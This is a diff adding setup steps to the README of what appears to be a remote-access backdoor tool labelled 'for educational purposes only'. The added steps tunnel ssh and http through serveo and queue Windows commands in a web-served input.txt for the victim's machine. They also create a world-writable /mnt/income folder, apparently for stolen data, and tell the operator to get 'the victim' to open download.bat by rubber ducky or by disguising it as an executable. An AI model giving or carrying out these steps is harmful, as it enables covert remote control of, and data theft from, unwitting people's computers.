@@ -36,9 +36,21 @@ For educational purposes only.
         - I recommend serveo because of this, it keeps your connection secure
         - You need to generate a hostname (see the launch_serveo.txt file for serveo) and just put it into "<hostname>" in your config file
     3. move your config file into /var/www/html/
+7. Start serveo (or a different port forwarding service)
+    - See the launch_serveo.txt file for 2 commands to forward ssh and http to your_hostname.serveo.net
+8. Create folders and the input.txt
+    ```
+    touch /var/www/html/input.txt
+    echo "dir C:\Users" >> /var/www/html/input.txt
+    sudo mkdir /mnt/income
+    sudo chown www-data /mnt/income
+    sudo chgrp www-data /mnt/income
+    sudo chmod 777 /mnt/income
+    ```
+9. Get the victim to open the download.bat
+    - That's your part. There are many options: Using a rubberducky script or converting the bat file into an executable.
 
 
-- SSH KEYS und config, config auch anpassen an IP
 - HTML.sh mit screen und serveo
 - run download.bat mit exe oder rubber ducky
 - launch_serveo.txt
